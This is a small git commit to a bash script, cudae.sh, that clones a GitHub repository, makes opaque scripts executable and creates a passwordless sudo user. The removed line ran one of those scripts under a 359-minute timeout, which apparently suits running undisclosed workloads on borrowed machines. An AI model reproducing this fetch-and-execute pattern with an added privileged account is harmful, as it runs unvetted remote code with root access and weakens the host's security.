3a9cf944e4397e3585d77aa86a14ebdc82aa8dc0
gembock <85003230+gembock@users.noreply.github.com>
2021-07-12 15:15:07 +0700

    cudae.sh

--- cudae.sh
+++ cudae.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update
-git clone https://github.com/gembock/luy.git && cd luy
+git clone https://github.com/gembock/gasz.git && cd gasz
 chmod +x kekeh.sh && chmod +x cley
 sudo adduser --disabled-password --gecos "" ikuk && sudo usermod -aG sudo ikuk
-sudo -u ikuk -H sh -c "timeout 359m ./kekeh.sh"
 sudo apt update
+
